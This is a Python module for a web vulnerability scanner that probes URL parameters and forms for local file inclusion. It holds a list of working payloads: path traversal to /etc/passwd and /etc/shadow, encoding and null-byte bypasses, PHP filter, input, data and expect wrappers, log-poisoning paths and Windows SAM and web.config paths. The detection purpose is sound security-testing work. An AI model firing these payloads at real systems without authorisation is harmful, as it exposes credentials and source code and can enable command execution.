"""
Local File Inclusion (LFI) Scanner — Industrial-Grade Multi-Signal Detection.

Detection methods:
1. Direct path traversal with known file content signatures (35+ payloads)
   - Double encoding, null byte injection, UTF-8 overlong encoding
   - Dot-slash normalization bypasses
2. PHP wrappers: filter variants, input, data, expect, phar
3. Log poisoning paths: Apache, Nginx, auth.log, syslog
4. Windows paths: boot.ini, SAM, web.config, hosts
5. Proc filesystem: /proc/self/cmdline, /proc/version, environ
6. Form-based testing

Anti-false-positive measures:
- File content signatures: matches specific file structure, not generic strings
- Baseline comparison: ignores indicators already in the page
- Response diff: verifies meaningful content change
- WAF detection: skips blocked responses
"""

import base64
import re
from core.http_client import get
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params, get_forms, submit_form

LFI_PAYLOADS = [
    # ── Basic Linux traversals ──
    ("../../../../etc/passwd", ["root:x:0:0", "daemon:x:1:1"]),
    ("../../../etc/passwd", ["root:x:0:0"]),
    ("../../../../../../etc/passwd", ["root:x:0:0"]),
    ("/etc/passwd", ["root:x:0:0"]),

    # ── Dot-slash bypass variants ──
    ("....//....//....//....//etc/passwd", ["root:x:0:0"]),
    ("....//../....//../....//../etc/passwd", ["root:x:0:0"]),
    ("....\\....\\....\\....\\etc\\passwd", ["root:x:0:0"]),
    ("..\\..\\..\\..\\/etc/passwd", ["root:x:0:0"]),

    # ── Double encoding ──
    ("..%252f..%252f..%252f..%252fetc%252fpasswd", ["root:x:0:0"]),
    ("%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", ["root:x:0:0"]),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", ["root:x:0:0"]),

    # ── Null byte injection (pre-PHP 5.3.4) ──
    ("../../../../etc/passwd%00", ["root:x:0:0"]),
    ("../../../../etc/passwd\x00.html", ["root:x:0:0"]),
    ("../../../../etc/passwd%00.jpg", ["root:x:0:0"]),

    # ── UTF-8 overlong encoding ──
    ("..%c0%ae/..%c0%ae/..%c0%ae/..%c0%ae/etc/passwd", ["root:x:0:0"]),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", ["root:x:0:0"]),

    # ── Proc filesystem ──
    ("/proc/self/environ", ["PATH=", "HOME=", "USER="]),
    ("/proc/version", ["Linux version"]),
    ("/proc/self/cmdline", ["apache", "httpd", "nginx", "python", "php"]),
    ("/proc/self/status", ["Name:", "State:", "Pid:"]),
    ("/proc/self/fd/0", ["/"]),

    # ── PHP wrappers ──
    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
    ("php://filter/convert.base64-encode/resource=../config.php", ["PD9waHA"]),
    ("php://filter/read=convert.base64-encode/resource=index.php", ["PD9waHA"]),
    ("php://filter/convert.base64-encode/resource=../wp-config.php", ["PD9waHA", "DB_"]),
    ("php://filter/string.rot13/resource=index.php", ["<?cuc", "<?="]),
    ("php://filter/zlib.deflate/resource=index.php", []),
    ("php://input", ["<?php"]),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", ["phpinfo()"]),
    ("data://text/plain,<?php phpinfo(); ?>", ["phpinfo()"]),
    ("expect://id", ["uid="]),
    ("phar://test.phar/test.txt", []),

    # ── Log poisoning paths ──
    ("/var/log/apache2/access.log", ["GET ", "HTTP/1."]),
    ("/var/log/apache/access.log", ["GET ", "HTTP/1."]),
    ("/var/log/nginx/access.log", ["GET ", "HTTP/1."]),
    ("/var/log/httpd/access_log", ["GET ", "HTTP/1."]),
    ("/var/log/auth.log", ["sshd", "session opened", "pam_"]),
    ("/var/log/syslog", ["kernel", "systemd"]),
    ("/var/log/mail.log", ["postfix", "dovecot"]),

    # ── Windows paths ──
    ("..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", ["127.0.0.1", "localhost"]),
    ("..\\..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]"]),
    ("C:\\Windows\\win.ini", ["[extensions]", "[fonts]"]),
    ("C:\\boot.ini", ["boot loader", "operating systems"]),
    ("..\\..\\..\\..\\windows\\system32\\config\\SAM", []),
    ("..\\..\\..\\..\\inetpub\\wwwroot\\web.config", ["configuration", "connectionStrings"]),
    ("..\\..\\..\\..\\windows\\system.ini", ["[drivers]"]),
    ("C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config", ["configuration"]),

    # ── Sensitive config files ──
    ("/etc/shadow", ["root:$"]),
    ("/etc/hosts", ["127.0.0.1", "localhost"]),
    ("/etc/hostname", []),
    ("/etc/issue", ["Ubuntu", "Debian", "CentOS", "Red Hat"]),
]


def test_lfi(url):
    baseline = get_baseline(url, get)

    for payload, indicators in LFI_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text = r.text
                text_lower = text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    ind_lower = ind.lower()
                    if ind_lower in text_lower and ind_lower not in baseline["text_lower"]:
                        signals["file_content"] = True
                        evidence = ind
                        break

                sim = diff_responses(baseline["text"], text)
                signals["response_diff"] = sim < ScannerConfig.DIFF_THRESHOLD
                signals["content_length"] = abs(len(text) - baseline["content_length"]) > 100

                # PHP wrapper base64 decode verification
                if "base64" in payload and "PD9waHA" in text:
                    try:
                        b64_match = re.search(r'([A-Za-z0-9+/]{50,}={0,2})', text)
                        if b64_match:
                            decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                            if '<?php' in decoded or '<?=' in decoded:
                                signals["file_content"] = True
                                evidence = "PHP source code via base64 wrapper"
                    except Exception:
                        pass

                # For payloads with empty indicator lists, require significant response_diff
                if not indicators and not signals.get("file_content"):
                    if sim < 0.50 and abs(len(text) - baseline["content_length"]) > 500:
                        signals["file_content"] = True
                        evidence = "Significant response change (possible binary/encoded file content)"
                    else:
                        continue

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    severity = "Critical"
                    if "passwd" in payload or "shadow" in payload or "SAM" in payload:
                        severity = "Critical"
                    elif "log" in payload:
                        severity = "High"
                    elif "config" in payload or "web.config" in payload:
                        severity = "Critical"
                    else:
                        severity = "High"

                    return make_finding(
                        url, "Local File Inclusion (LFI)", confidence, signals,
                        details=f"File content '{evidence}' via param '{param}'",
                        severity=severity,
                        payload=payload, evidence=evidence, parameter=param,
                    )
            except Exception:
                continue

    # ── Form-based LFI ──
    forms = get_forms(url)
    for payload, indicators in LFI_PAYLOADS[:10]:
        for form in forms:
            try:
                r = submit_form(form, url, payload)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for ind in indicators:
                    if ind.lower() in text_lower and ind.lower() not in baseline["text_lower"]:
                        signals["file_content"] = True
                        evidence = ind
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                if not signals.get("file_content"):
                    continue

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "Local File Inclusion (Form-Based)", confidence, signals,
                        details=f"File content '{evidence}' via form",
                        severity="High", payload=payload, evidence=evidence,
                    )
            except Exception:
                continue

    return None
